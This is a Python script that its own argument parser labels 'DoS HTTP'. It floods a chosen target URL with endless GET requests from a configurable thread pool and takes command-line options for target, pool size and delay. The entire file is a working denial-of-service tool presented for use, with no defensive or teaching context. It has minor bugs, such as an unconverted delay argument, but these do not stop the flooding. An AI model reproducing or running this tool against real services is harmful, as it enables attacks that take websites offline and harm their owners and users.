import requests
import argparse
from concurrent.futures import ThreadPoolExecutor
from time import sleep


parser = argparse.ArgumentParser(description="DoS HTTP")
parser.add_argument('-P', '--poolsize',  default=10, help='Size of the threadpool')
parser.add_argument('-T', '--target',  default='localhost', help='Target URL for http request')
parser.add_argument('-D', '--delay', default=0, help='Amount of time to wait between requests')

args = parser.parse_args()
threadpool_size = int(args.poolsize)
target = args.target
delay = args.delay


terminate = False


def http_request(url):

    global terminate

    while True and not terminate:

        response = requests.get(url)
        if not response.ok:
            print(f"!!! HTTP request failed, code: {response.status_code}")
        else:
            print("---> HTTP request successful")

        if delay > 0:
            for _ in range(0, delay): sleep(1)

    print("...http_request thread terminated")

def main():

    global terminate

    try:
        targets = [target for _ in range(0, threadpool_size)]
        with ThreadPoolExecutor(max_workers=threadpool_size) as executor:
            executor.map(http_request, targets)

    except KeyboardInterrupt:
        print("... terminating application ...", end="")
        terminate = True
        print("terminated")


if __name__ == "__main__":
    main()
